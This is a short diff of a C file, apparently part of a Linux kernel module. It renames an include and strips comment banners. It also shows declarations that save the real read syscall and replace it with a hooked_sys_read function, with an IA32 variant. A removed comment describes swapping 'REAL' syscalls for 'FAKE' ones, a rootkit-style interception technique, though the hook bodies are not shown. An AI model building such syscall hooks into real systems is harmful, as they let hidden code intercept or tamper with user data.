@@ -1,14 +1,5 @@
-#include "fns.h"
+#include "read.h"
 
-/*****************************************************************************\
-| (For each syscall) Define a function which we will use to save the REAL     |
-| syscall function and define a FAKE function which we will use to replace    |
-| the REAL one.                                                               |
-| Also, do that for x86 and x64 cases, AND for the special IA32 case.         |
-| A list of all syscalls can be retrieved using man (man syscalls).           |
-\*****************************************************************************/
-
-/* __NR_read / __NR32_read */
 asmlinkage ssize_t (*real_sys_read)(unsigned int fd, char __user *buf, size_t count);
 asmlinkage ssize_t hooked_sys_read(unsigned int fd, char __user *buf, size_t count){
 
@@ -108,7 +99,3 @@ asmlinkage ssize_t hooked_sys_read32(unsigned int fd, char __user *buf, size_t c
 	}
 }
 #endif
-
-/*****************************************************************************\
-|                                      END                                    |
-\*****************************************************************************/
